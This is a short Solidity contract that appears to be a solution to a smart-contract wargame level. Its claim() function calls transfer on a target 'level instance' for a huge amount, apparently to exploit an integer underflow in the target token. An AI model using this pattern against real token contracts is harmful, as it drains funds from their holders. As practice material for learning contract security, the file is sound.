// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Token {
    address levelInstance;
        constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }
    function claim() public {
        IToken(levelInstance).transfer(msg.sender, 999999999999999);
    }
}